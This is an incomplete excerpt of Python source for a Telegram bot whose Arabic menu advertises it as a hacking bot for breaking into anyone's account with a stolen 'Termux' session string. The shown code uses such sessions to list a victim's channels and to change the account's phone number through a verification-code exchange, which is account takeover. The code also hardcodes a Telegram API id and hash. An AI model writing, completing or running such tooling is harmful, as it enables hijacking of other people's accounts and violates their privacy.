...
async def userchannels(strses):
  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
    ...
    for x in k.chats:
      try:
        i += f'\n#️⃣︙ اسم القنـاة {x.title} - معرف القنـاة @{x.username}\n'
      except:
        pass
    return str(i)
...
'''
mm = '''
** اهلا بك في بوت سيلفا للاختراق  يمكنك اختراق اي شخص عبر كود تيرمكس
...
async def op(event):
  ...
  if not event.is_private:
    await event.reply("#️⃣︙ عذرا البوت يعمل في الخاص فقط")
  else:
...
@client.on(events.NewMessage(pattern="/Timo", func=lambda x: x.is_group))
async def op(event):
  await event.reply("#️⃣︙ عذرا البوت يعمل في الخاص فقط")
@client.on(events.NewMessage(pattern="/Timo", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"#️⃣︙ قـائمة اوامر البوت :\n{menu}")
    ...
    if res.text == "1":
      ...
      if op:
        ...
        return await event.respond("#️⃣︙ عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("#️⃣︙ حسنا الان ارسل معرف القناة او المجموعة")
      ...
      if op:
        ...
        return await event.respond("#️⃣︙ عذرا هذا الكود انتهت صلاحيته ")
      await x.send_message("#️⃣︙ الان ارسل معرف او رابط القناه او المجموعة")
      grp = await x.get_response()
      await x.send_message("#️⃣︙ الان ارسل معرف المستخدم")
      ...
      try:
        ...
        await x.send_message("#️⃣︙ ارسل الان كود التحقق")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("#️⃣︙ تم تغيير الرقم بنجاح")
        else:
      ...
      await event.respond("#️⃣︙ استخدم /Timo فقط")
